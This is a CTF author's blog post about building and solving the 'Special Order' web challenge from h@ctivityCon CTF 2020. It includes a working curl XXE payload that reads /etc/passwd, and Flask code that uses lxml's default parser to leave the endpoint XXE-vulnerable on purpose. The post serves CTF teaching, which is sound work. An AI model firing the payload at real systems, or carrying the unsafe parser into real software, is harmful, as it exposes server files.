---
layout: post
title: thoughts on making CTFs
date: 2020-08-01 15:04 +0300
author: pop_eax
categories: ["ctf-writeup", "web"]
---

# Special Order h@ctivityCon CTF 2020

making a big CTF challenge was always on my todo list, yes I made a couple of CTF challenges before
but none of them actually made it to such a big event.

## challenge writeup

accessing the challenge url we get redirected to `/login`

![login](https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/Login.png)

we see there's an option to register so we register a user, then login

![blog](https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/Blog-1.png)

creating a post

![post-1](https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/post-1.png)
![post-2](https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/post-2.png)

also we have the ability to customize how our posts look
<br />*interesting*

![customize-1](https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/customize-1.png)
<br />
![customize-2](https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/customize-2.png)

~~looks ugly ngl~~

from here we can observe that our customization input is getting to the css file

![css](https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/css.png)

looking back at the request for customizing the post's look

![request](https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/customize-request.png)

changing the content-type header we see that the app accepts xml

![curl](https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/curl.png)

so let's send an xxe payload
```bash
curl 'http://ip/customize' \
      -H 'Content-Type: application/xml' \
      -H 'Cookie: session=sessionCookie' \
      --data-binary '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [  <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><root><color>&xxe;</color><size>20px</size></root>'
```

![passwd](https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/passwd.png)

now just read /flag.txt and done :)

## building the challenge

I took some time to imagine how the challenge should be.
when I thought about coding it, I saw it as a huge problem and I got frustrated
and thought I can't make it on time or I can't even do it 

so I seperated it into simple problems like this:

- create signin/signup functionality
- create a blog
- add the ability to share posts
- make the looks customizable
- make the `/customize` endpoint accept json and xml
- parse the xml and make it xxe-able

### and this was day 1

I started with making a simple flask app then I added a login template to it
then I had to learn about SQLAlchemy
what I did in here is that I didn't just follow a SQLAlchemy tutorial
instead I read some of the docs and then I read stuff off github and stackoverflow
I had a little bit of SQLAlchemy experince before, but it needed some refresh
I am not sure if this is the most "efficient" learning way but I like it and it works better for me.

so I ended up with this db model
```py
class User(db.Model):
    __tablename__ = "users"

    uuid = db.Column(db.Integer, primary_key=True)
    username = db.Column(Text, unique=True)
    password = db.Column(Text)

    def __repr__(self):
        return "<uuid %r>" % self.username
```
login code
```py
user = db.session.query(users_map).filter(or_(users_map.username == username)).first()
    if  user and check_password_hash(user.password, password):
        #do stuff
```
signup code
```py
password_hash = generate_password_hash(password)
users_table = Table('users', metadata, autoload=True)

    if db.session.query(users_map).filter(or_(users_map.username == username)).first():
        return "<h1> duplicate username :(</h1>"
    engine.execute(users_table.insert(), username=username, password=password_hash)
```

~~create signin/signup functionality~~ DONE

now making a blog was simple I just googled for blog templates
and found this one https://github.com/StartBootstrap/startbootstrap-clean-blog
then I just had to serve static files and add templates and endpoints

~~create a blog~~ also done

### day 2 ended in here

adding posts was easy

db model
```py
class Post(db.Model):
    __tablename__ = "posts"

    uuid = db.Column(db.Integer, primary_key=True)
    author = db.Column(Text)
    title = db.Column(db.String(256), index=True)
    body = db.Column(Text)

    def __repr__(self):
        return "<uuid %r>" % self.author
```

backend code
```py
engine.execute(posts_table.insert(), author=author, title=title, body=post_body)
```

then I just made a query to list all the user made posts and rendered the result in `/`

~~add the ability to share posts~~ DONE

now for making the post's look customizable I just created a table called user_settings
and made the css file for the post dynamic

the db side was pretty much the same as above with some minor tweaks

but making the css dynamic errored a lot because `{}` gets parsed the jinja2 the template engine for 
flask, so I had to figure out a way to make it work
after reading stuff online, I ended up with this

backend code
```py
def get_resource_as_string(name, charset='utf-8'):
    with app.open_resource(name) as f:
        return f.read().decode(charset)

if db.session.query(settings_map).filter_by(username=session['username']).first():
            post_size = db.session.query(settings_map).filter_by(username=session['username']).first().size
            post_color = db.session.query(settings_map).filter_by(username=session['username']).first().color 

        return render_template("clean-blog.css", color=post_color,size=post_size,w=get_resource_as_string("static/css/clean-blog.css"))
```
template file
{% raw %}
```
{{w}}

* {{'{'}}
    font-size: {{size}};
    color: {{color}};
    {{'}'}}
```
{% endraw %}
*I know it's a mess but it works*

P.S: this is me from the future and guess what, I am using jekyll as backend to my blog and it errored from template file so I had to use `{% raw %} {% endraw %}` to make it work.
*ironic isn't it*

but it didn't work for some reason, the browser didn't actually pick up the css code
until I opened the dev-tools which was pretty annoying.

at first I thought it's just an issue because of the syntax or whatever
after changing the css code a lot, I didn't get any change in the thing
so I examined the response and it turns out it was sending a wrong mimetype which led the browser
into not executing it
so I changed the code to this
```py
return Response(render_template("clean-blog.css", color=post_color,size=post_size,w=get_resource_as_string("static/css/clean-blog.css")), mimetype="text/css")
```
aaand it worked :)

~~make the looks customizable~~ DONE

now changing the regular `Content-type: application/url-encoded` form to use json wasn't that simple
maybe there's a better way but I used javascript to submit a json request since I had jquery already
fetched with template I utilized it

```javascript
function submitSettings(){
            let data = `{"color" : "${$("#choosenColor").serializeArray()[0].value}", "size": "${$("#choosenSize").serializeArray()[0].value}"}`
            $.ajax({
                type: "POST",
                url: "/customize",
                data: data,
                success: function(){},
                dataType: "json",
                contentType : "application/json"
                });
            alert("settings changed successfully");
          }
```

html thing
```html
<button onclick="submitSettings()" type="submit" class="btn btn-primary SubmitSettings">Submit</button>
```
*at the end it turns out these weird html stuff had a use other than xss*

adding xml support was easy but it turns out the normal xml library isn't xxe-able by default
after reading more about it, I realized lxml was xxe-able by default :)

~~make the `/customize` endpoint accept json and xml~~

### day 3 ended in here

at the other day I just plugged lxml code with the app and here we go

```py
from lxml import etree
parser = etree.XMLParser()
k = etree.fromstring(request.data, parser)
post_color = ""
post_size = ""
w = ""
for i in k.getchildren():
    if i.tag == "color":
        post_color = i.text
    elif i.tag == "size":
        post_size = i.text
    if db.session.query(settings_map).filter_by(username=session['username']).first():
            db.session.query(settings_map).filter_by(username=session['username']).update({"size": post_size, "color": post_color})
            db.session.commit()

```

~~parse the xml and make it xxe-able~~

**now it's time to ship the code and deploy**
nope it's not :P

I sent a message to john that it's done, and he told it would be better if I dockerized so they can deploy it easily
now I had another task I didn't think of

I tried to do some stuff with docker but most of them fucked up so I decided to get help from a friend who can actually
use docker decently and plus he was working with the infra team on the CTF so I sent a message to `MEhrn00` and he sent
me a basic alpine linux DockerFile

```dockerfile
FROM alpine:3.7

COPY ./app /app
WORKDIR /app

RUN apk add --no-cache                      \
        gcc g++ gnupg make libffi-dev       \
        openssl-dev uwsgi-python3 python3   \
        python3-dev                         \
    && pip3 install -r requirements.txt

CMD [ "uwsgi", "--socket", "0.0.0.0:7100",  \
               "--uid", "uwsgi",            \
               "--plugins", "python3",      \
               "--protocol", "http",        \
               "--wsgi", "main:app" ]

EXPOSE 7100
```

and it didn't work, because lxml installation was erroring for no reason

*weird error I don't understand*
```
 gcc -Wno-unused-result -Wsign-compare -DNDEBUG -g -fwrapv -O3 -Wall -Os -fomit-frame-pointer -g -Os -fomit-frame-pointer -g -Os -fomit-frame-pointer -g -DTHREAD_STACK_SIZE=0x100000 -fPIC -DCYTHON_CLINE_IN_TRACEBACK=0 -Isrc -Isrc/lxml/includes -I/usr/include/python3.6m -c src/lxml/etree.c -o build/temp.linux-x86_64-3.6/src/lxml/etree.o -w
    In file included from src/lxml/etree.c:692:0:
    src/lxml/includes/etree_defs.h:14:31: fatal error: libxml/xmlversion.h: No such file or directory
     #include "libxml/xmlversion.h"
                                   ^
    compilation terminated.
    Compile failed: command 'gcc' failed with exit status 1
    creating tmp
    cc -I/usr/include/libxml2 -c /tmp/xmlXPathInitf75pvacz.c -o tmp/xmlXPathInitf75pvacz.o
    /tmp/xmlXPathInitf75pvacz.c:1:26: fatal error: libxml/xpath.h: No such file or directory
     #include "libxml/xpath.h"
                              ^
    compilation terminated.
    *********************************************************************************
    Could not find function xmlCheckVersion in library libxml2. Is libxml2 installed?
    *********************************************************************************
    error: command 'gcc' failed with exit status 1
    
```

I just googled for some stuff online to fix it
and I ended up with this
```dockerfile
FROM alpine:3.7

COPY ./app /app
WORKDIR /app

RUN apk add --update --no-cache                      \
        gcc g++ gnupg make libffi-dev       \
        openssl-dev uwsgi-python3 python3   \
        python3-dev                         \
        libxslt-dev                         \
    && pip3 install -r requirements.txt

CMD [ "uwsgi", "--socket", "0.0.0.0:7100",  \
               "--uid", "uwsgi",            \
               "--plugins", "python3",      \
               "--protocol", "http",        \
               "--wsgi", "main:app" ]

EXPOSE 7100
```
the app worked but ...
every time I tried to insert into the db I got `db only readable`
it was because I started the container as root but ran the code as uwsgi
I had the option to start the container as the uwsgi users but I didn't like this way
and `chmod 777 file.db` didn't work too
I found a way about putting the db file into a directory and `chown`-ing the dir to make it work

```dockerfile
FROM alpine:3.7

COPY ./app /app
WORKDIR /app

RUN apk add --update --no-cache                      \
        gcc g++ gnupg make libffi-dev       \
        openssl-dev uwsgi-python3 python3   \
        python3-dev                         \
        libxslt-dev                         \
    && pip3 install -r requirements.txt

RUN chmod a+rw db_file db_file/*

CMD [ "uwsgi", "--socket", "0.0.0.0:5000",  \
               "--uid", "uwsgi",            \
               "--plugins", "python3",      \
               "--protocol", "http",        \
               "--wsgi", "wsgi:app",         \
                "--master"]

EXPOSE 5000
```

finally it worked and I no longer had to worry about any deadlines.

### day 4 ended in here

I worked 4 hours a day so it took me 16 hours to finish it, I could have finished it earlier if I stopped procrastinating 
anyways 
it's done

source code available at [github repo](https://github.com/pop-eax/SpecialOrder)

## challenge stats
![ctf](https://pbs.twimg.com/media/EeRxFOFX0AAhjzQ?format=png&name=900x900)

## explaining stuff about the idea of the challenge

**isn't this challenge considered pure guessing and nothing was learned in here ?**

the `content-type` thing is popular and it happened in a couple of real life applications,
because you never know what the devs think of the app may have used xml before or it was in there for just in case
`¯\_(ツ)_/¯`
also it was used in multiple CTFs before which got me amazed how really few people solved it like:

- [GoogleCTF 2019](https://www.youtube.com/watch?v=0fdpFQXWVu4)

***wait but what about the math thing in the challenge description?***

it is a second order equation, and the bug is a second order xxe :P

